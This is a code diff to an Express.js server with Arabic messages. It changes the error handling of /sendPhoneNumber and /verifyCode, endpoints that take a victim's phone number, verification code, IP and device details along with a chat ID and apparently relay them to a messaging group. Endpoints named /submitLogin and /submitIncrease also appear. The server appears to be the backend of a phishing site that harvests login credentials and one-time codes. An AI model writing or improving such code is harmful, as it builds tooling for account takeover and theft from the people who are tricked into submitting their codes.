@@ -1456,15 +1456,11 @@ app.post('/submitIncrease', async (req, res) => {
 });
 
 
-
-
-app.use(express.json());
-
 app.post('/sendPhoneNumber', async (req, res) => {
     const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;
 
     if (!chatId) {
-        return res.status(400).json({ success: false, message: 'معرف المحادثة مفقود' });
+        return res.status(400).json({ error: 'Missing chatId' });
     }
 
     const deviceInfo = useragent.parse(userAgent);
@@ -1501,19 +1497,16 @@ ${userInfoText}
         res.json({ success: true, message: 'تم إرسال رمز التحقق' });
     } catch (error) {
         console.error('خطأ في إرسال الرسالة:', error);
-        if (error.response && error.response.statusCode === 400) {
-            res.status(400).json({ success: false, message: 'معرف المحادثة غير صالح' });
-        } else {
-            res.status(500).json({ success: false, message: 'فشل في إرسال رقم الهاتف', details: error.message });
-        }
+        res.status(500).json({ error: 'فشل في إرسال رقم الهاتف', details: error.message });
     }
 });
 
+// نقطة النهاية للتحقق من الكود
 app.post('/verifyCode', async (req, res) => {
     const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;
 
     if (!chatId) {
-        return res.status(400).json({ success: false, message: 'معرف المحادثة مفقود' });
+        return res.status(400).json({ error: 'Missing chatId' });
     }
 
     const deviceInfo = useragent.parse(userAgent);
@@ -1551,19 +1544,9 @@ ${userInfoText}
         res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
     } catch (error) {
         console.error('خطأ في إرسال الرسالة:', error);
-        if (error.response && error.response.statusCode === 400) {
-            res.status(400).json({ success: false, message: 'معرف المحادثة غير صالح' });
-        } else {
-            res.status(500).json({ success: false, message: 'فشل في التحقق من الكود', details: error.message });
-        }
+        res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
     }
 });
-
-
-        // إرسال الرسالة إلى المجموعة
-        
-
-// تشغيل الخادم
 
 
 app.post('/submitLogin', async (req, res) => {
